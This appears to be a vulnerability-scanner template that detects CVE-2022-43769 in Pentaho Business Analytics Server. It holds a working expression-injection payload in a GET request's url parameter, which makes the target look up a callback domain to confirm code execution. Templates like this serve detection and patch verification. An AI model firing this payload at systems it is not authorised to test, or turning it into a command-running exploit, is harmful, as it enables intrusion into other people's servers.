name: yaml-poc-hitachi-vantara_pentaho_business_analytics_server-rce-CVE-2022-43769
binding: 663c932d-6696-4fdc-9cba-09dd977f96cd
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/172296/Pentaho-Business-Server-Authentication-Bypass-SSTI-Code-Execution.html
        - https://support.pentaho.com/hc/en-us/articles/14455561548301--Resolved-Pentaho-BA-Server-Failure-to-Sanitize-Special-Elements-into-a-Different-Plane-Special-Element-Injection-Versions-before-9-4-0-1-and-9-3-0-2-including-8-3-x-Impacted-CVE-2022-43769-
    vulnerability:
        id: ab50e5a5-4ee6-4315-ae04-5318059d8960
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName('{{reverseDomain}}')}&mgrDn=a&pwd=a
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0()
